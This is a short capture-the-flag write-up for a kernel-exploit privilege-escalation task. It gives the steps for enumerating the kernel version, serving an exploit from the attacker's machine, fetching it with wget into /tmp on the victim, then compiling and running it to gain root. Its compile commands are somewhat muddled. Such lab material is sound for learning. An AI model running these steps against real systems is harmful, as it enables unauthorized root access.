Task 5 {Privilege Escalation - Kernel Exploits}

Question 1: What is the content of the flag1.txt file?
{{First, enumerate the kernel version with uname -a and which Linux using cat /etc/issue.
Search for an appropriate exploit (I used the same one in the last task), and download it.
Start an http server (python3 -m http.server [portnumber] will work)
On the victim machine, navigate to the /tmp/ folder
Use wget http://[Your Machine IP:port]/exploit.c
chmod +x exploit.c
Compile it using gcc exploit.c -o exploit.c
run ./exploit.c

If done correctly, you should now be root.
